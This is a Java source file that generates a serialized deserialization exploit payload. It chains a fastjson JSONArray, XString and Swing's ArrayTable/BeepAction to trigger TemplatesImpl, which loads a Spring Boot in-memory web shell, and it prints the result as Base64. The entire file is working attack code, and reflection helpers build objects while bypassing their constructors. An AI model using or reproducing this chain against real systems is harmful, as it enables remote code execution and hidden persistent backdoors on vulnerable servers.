package gadget;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;

import gadget.memshell.SpringBootMemoryShellOfController;
import sun.reflect.ReflectionFactory;
import util.GadgetUtils;
import util.SerializerUtils;

import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.DefaultEditorKit;
import java.lang.reflect.*;
import java.util.Base64;

import com.alibaba.fastjson.JSONArray;
public class FJ_toString {
    public static void main( String[] args ) throws Exception {
        TemplatesImpl templatesImpl = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templatesImpl);           //此时在handles这个hash表中查到了映射，后续则会以引用形式输出

        XString xString = new XString("a");

        DefaultEditorKit.BeepAction action = new DefaultEditorKit.BeepAction();
        SwingPropertyChangeSupport swingPropertyChangeSupport = new SwingPropertyChangeSupport("");

        Object arraytable = createWithoutConstructor("javax.swing.ArrayTable");
        setFieldValue(arraytable,"table",new Object[]{"1",xString,"2",jsonArray});
        setFieldValue(action,"arrayTable",arraytable);
        setFieldValue(action,"changeSupport",swingPropertyChangeSupport);

        System.out.println(Base64.getEncoder().encodeToString(SerializerUtils.serialize(action)));
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
    public static Object createWithoutConstructor(String classname) throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        return createWithoutConstructor(Class.forName(classname));
    }

    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }
}
